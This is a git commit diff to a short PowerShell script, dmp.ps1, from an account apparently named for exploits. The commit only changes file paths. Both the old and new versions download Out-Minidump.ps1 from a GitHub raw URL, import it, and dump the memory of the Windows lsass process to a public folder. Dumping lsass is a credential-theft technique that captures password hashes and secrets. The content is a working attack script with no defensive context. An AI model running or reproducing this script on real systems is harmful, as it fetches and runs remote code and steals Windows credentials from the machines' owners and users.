dcd8284e3a9d40117564967900873e7af772edb9
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2017-10-26 15:54:39 +0500

    Update dmp.ps1

--- dmp.ps1
+++ dmp.ps1
@@ -1,3 +1,3 @@
-(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/ExploitGF/power/master/Out-Minidump.ps1","C:\Users\dump.ps1")
-import-module C:\Users\dump.ps1
-Get-Process lsass | Out-Minidump -DumpFilePath C:\Users\
+(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/ExploitGF/power/master/Out-Minidump.ps1","C:\Users\Public\dump.ps1")
+import-module C:\Users\Public\dump.ps1
+Get-Process lsass | Out-Minidump -DumpFilePath C:\Users\Public
